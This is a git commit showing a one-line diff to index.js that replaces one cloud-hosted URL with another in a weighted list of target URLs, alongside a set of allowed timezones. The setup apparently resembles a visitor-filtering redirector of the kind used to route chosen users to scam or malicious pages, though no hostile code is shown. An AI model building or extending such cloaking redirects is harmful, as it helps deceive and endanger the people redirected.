03e6abb188bd08e944334b87d1aeb8cd2f09fad7
paalakash <palaksh452@gmail.com>
2026-06-29 21:15:14 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://shark-app-4wyaa.ondigitalocean.app/Win0codejInfowj2n/index.html", weight: 1.0 }
+    { url: "https://nww.sgp1.digitaloceanspaces.com/Win0codejInfowj2n/index.html", weight: 1.0 }
 
 ];
 
